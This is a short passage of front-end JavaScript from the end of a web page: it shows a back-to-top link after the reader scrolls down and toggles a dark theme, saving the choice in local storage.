mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>